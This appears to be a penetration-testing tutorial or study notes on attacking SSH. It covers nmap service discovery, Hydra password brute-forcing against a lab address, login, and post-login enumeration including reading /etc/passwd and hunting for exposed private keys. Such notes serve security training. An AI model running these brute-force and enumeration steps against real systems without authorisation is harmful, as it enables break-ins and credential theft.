# Exploiting SSH ‚Äì Full Workflow

## üîê What Is SSH?

- **Secure Shell**: Encrypted remote administration protocol (replaced Telnet)
- **Default Port**: `22/TCP` (but can run on any port)
- **Auth Methods**:
  - ‚úÖ **Password-based** ‚Üí vulnerable to brute-force  
  - üîí **Key-based** ‚Üí more secure (no password)

> ‚ö†Ô∏è **Many small companies still use password auth** ‚Äî making SSH a prime target.

---
## Step 1: Discover SSH Service

```bash
nmap -sV -p 22 192.168.1.10
```
‚Üí Confirms `OpenSSH 7.4` or similar.

 üí° If port is non-standard (e.g., `2222`), scan all ports:
 ```bash
 nmap -p- 192.168.1.10
 ```

---
## Step 2: Brute-Force Credentials with Hydra

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt \
      -t 4 \
      ssh://192.168.1.10
```

### Flags Explained
| Flag | Purpose |
|------|--------|
| `-L` | Username wordlist |
| `-P` | Password wordlist |
| `-t 4` | Limit to 4 parallel threads (avoid lockout/crash) |

‚úÖ Success:  
`[22][ssh] host: 192.168.1.10   login: sysadmin   password: admin123`

---
## Step 3: Log In & Enumerate

```bash
ssh sysadmin@192.168.1.10
# Enter password when prompted
```

### Post-Login Enumeration
```bash
whoami                    # Current user
groups                    # Group memberships
cat /etc/issue            # OS banner
uname -a                  # Kernel version
cat /etc/passwd           # List all users
id                        # UID/GID info
```

> üí° **Why enumerate?**  
> - Find other users for lateral movement  
> - Check kernel version for local exploits (`searchsploit linux kernel 4.4`)  
> - Identify misconfigurations (sudo rights, SUID binaries)

---
## ‚ö†Ô∏è Critical Notes

- **SSH brute-forcing is noisy** ‚Üí may trigger account lockout or alerts
- Always use **low thread count** (`-t 1‚Äì4`) in real engagements
- If **key-based auth only**, brute-force won‚Äôt work ‚Äî look for exposed keys (`~/.ssh/id_rsa`)
- **Never assume port 22** ‚Äî always verify with full port scan in black-box tests



